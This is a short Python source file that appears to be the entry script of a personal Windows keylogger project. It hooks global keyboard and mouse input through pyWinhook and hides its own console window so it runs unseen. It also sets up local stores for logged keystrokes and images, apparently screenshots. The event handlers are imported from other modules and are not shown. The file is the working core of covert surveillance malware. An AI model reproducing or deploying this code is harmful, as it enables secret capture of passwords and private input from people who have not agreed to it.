import win32api
import win32console
import win32gui
import pyWinhook as pyHook
import pythoncom
import pathlib

from Events.OnKeyboardEvent import OnKeyboardEvent
from Tools.EventStore import EventStore
from Tools.ImageStore import ImageStore
from Events.OnMouseEvent import left_down, right_down, middle_down


def attachInputEvents():
    hm = pyHook.HookManager()
    hm.SubscribeMouseLeftDown(left_down)
    hm.SubscribeMouseRightDown(right_down)
    hm.SubscribeMouseMiddleDown(middle_down)
    hm.HookMouse()

    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()

    pythoncom.PumpMessages()

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

path = pathlib.Path('D:\Downloads\edureka\personal project\logs.txt')
imagesPath = pathlib.Path('D:\Downloads\edureka\personal project\images\\')
EventStore(path)
ImageStore(imagesPath)

print("Content being written in: ", path)
print("Images being written in: ", imagesPath)